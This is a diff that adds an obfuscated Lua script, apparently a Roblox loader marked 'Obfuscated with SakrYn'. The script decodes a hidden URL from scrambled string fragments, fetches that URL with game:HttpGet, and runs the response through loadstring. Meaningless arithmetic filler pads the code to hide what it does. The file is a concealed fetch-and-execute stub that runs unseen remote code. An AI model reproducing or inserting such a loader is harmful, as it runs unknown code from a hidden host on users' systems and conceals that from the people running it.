@@ -1,0 +1,51 @@
+-- Obfuscated with SakrYn at dsc.gg/sakryn | ON TOP
+
+
+
+                                          local m
+                                       = {[12] =
+                                    "9ur", [8]
+                                  = "BGFZ", [4
+                                ] = "0xRc", [
+                              5] = "raLqa:",
+                             [1] = "/M0", [9
+                             ] = "?{uqP", [
+                            10] = "Mps", [
+                            15] = "+NW", [
+                        2]   = "D/Qe&",  [
+                       16]   = "YJ^m", [11
+                      ]  =   "+k?c)", [6 ]
+                      =       "7V$", [7] =
+                              ")m!C1", [13
+                     ]     =  "->h", [3]  =
+                    "WPs>C",   [  14  ]   =
+                    "CMl9"} ;   local  e   =
+                    "01234" ..   "56789"  ..
+                    "abcde".."f"  .."ghij" ..
+                    "klmno".."pq"  .. "rst" .. "u"
+                    .."vwxy".."zA"   .."BCD".."EF"          .."G"    ..
+                     "HI".."JKLMN"..   "OPQRS"  ..          "TUVWX".."YZ"
+                     ..".-:".. "+=^!/"  .. "*?&<>"     .."(){}@".."%$#_|";
+                      local w =  table.concat( m) ; local q = {}; local u =
+                      32228; for k = 1, #w, 5 do local j = 0; for y = k, k  +
+                         4 do j = j * 85 + string.find( e, w:sub(y, y), 1 ,
+                              true) - 1; end; for y = 3, 0, - 1 do u = (u *  25
+                        + 30392)     % 65521; q [#q +  1] = string .char(bit32 .
+                          bxor(math.floor(j/256^y ) % 256, u % 256)) ;       end
+                           ; end; m = table .concat(q): sub(1, 51) ;
+                            local p, f = loadstring(game:HttpGet(m)
+                              ); assert(p, f); do local h = {1, 6}
+                                ; h[1  ] = h[2] % 1; end; local h =
+                                     1 - 2 + 5 + 3 + 8 % 9 % 4 %  9
+                                    - 3 - 9 + 9 + 2 % 4 + 6 - 3 +  9
+                                        - 1 - 2 % 9 % 7 % 3 % 2 % 7  +
+                                               1 + 6 + 2 - 6 % 4 + 1  %
+                                                      4 % 3 % 2 % 7 -  2
+                                                           + 5 % 7 - 5  +
+                                                               4 + 1 + 4 +
+                                                                  8  -   6;
+                                                                     return
+                                                                          p(
+                                                                         ...
+
+                                                                            )
